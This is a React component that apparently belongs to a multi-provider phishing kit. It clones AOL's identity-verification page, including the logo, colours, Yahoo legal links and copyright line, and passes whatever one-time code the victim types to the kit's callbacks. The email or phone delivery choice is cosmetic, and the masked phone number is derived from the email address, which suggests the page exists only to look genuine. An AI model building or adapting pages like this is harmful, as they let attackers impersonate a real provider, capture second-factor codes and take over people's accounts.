import React, { useState, useRef, useEffect } from 'react';
import Spinner from '../common/Spinner';
import { OtpProviderProps, maskEmail, maskPhone, UserAvatar } from './otpUtils';

const AolOtp: React.FC<OtpProviderProps> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
  const [resendSent, setResendSent] = useState(false);
  const [aolCodeValue, setAolCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleAolCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
    setAolCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <div className="w-full max-w-md">
        <div className="text-center mb-6">
          <svg viewBox="0 0 200 72" className="mx-auto h-10 mb-6">
            <g fill="#000000">
              <path d="M0 72 L25 0 H41 L66 72 H49 L43 52 H23 L17 72 Z M27 40 L33 14 L39 40 Z"/>
              <path d="M103 2 A34 34 0 1 1 103 70 A34 34 0 1 1 103 2 Z M103 19 A17 17 0 1 0 103 53 A17 17 0 1 0 103 19 Z"/>
              <path d="M144 0 H162 V54 H200 V72 H144 Z"/>
            </g>
          </svg>
        </div>

        <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
          <h1 className="text-xl font-bold text-gray-900 mb-4">Verify your identity</h1>

          {email && (
            <div className="flex items-center gap-3 mb-5">
              <UserAvatar email={email} size={36} />
              <span className="text-sm font-semibold text-gray-900">{email}</span>
            </div>
          )}

          <p className="text-sm text-gray-600 mb-3">Where should we send your verification code?</p>

          <div className="space-y-2 mb-6">
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'email' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'email' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'email'} onChange={() => setDeliveryMethod('email')} className="accent-[#39007E]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Email</p>
                <p className="text-xs text-gray-500">{email ? maskEmail(email) : 'Email address on file'}</p>
              </div>
            </label>
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'phone' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'phone' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'phone'} onChange={() => setDeliveryMethod('phone')} className="accent-[#39007E]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Phone number</p>
                <p className="text-xs text-gray-500">{email ? maskPhone(email) : 'Phone number on file'}</p>
              </div>
            </label>
          </div>

          <form onSubmit={onSubmit} className="space-y-6">
            {errorMessage && (
              <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter code"
                value={aolCodeValue}
                onChange={handleAolCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#39007E] focus:border-[#39007E] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div className="mt-6 text-center">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm font-medium hover:underline disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#39007E' }}>
              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
            </button>
          </div>
        </div>

        <div className="mt-6 text-center text-xs text-gray-500">
          <div className="flex items-center justify-center gap-3">
            <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
            <span className="text-gray-300">|</span>
            <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
          </div>
          <p className="mt-2 text-gray-400">© 2026 Aol. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

export default AolOtp;
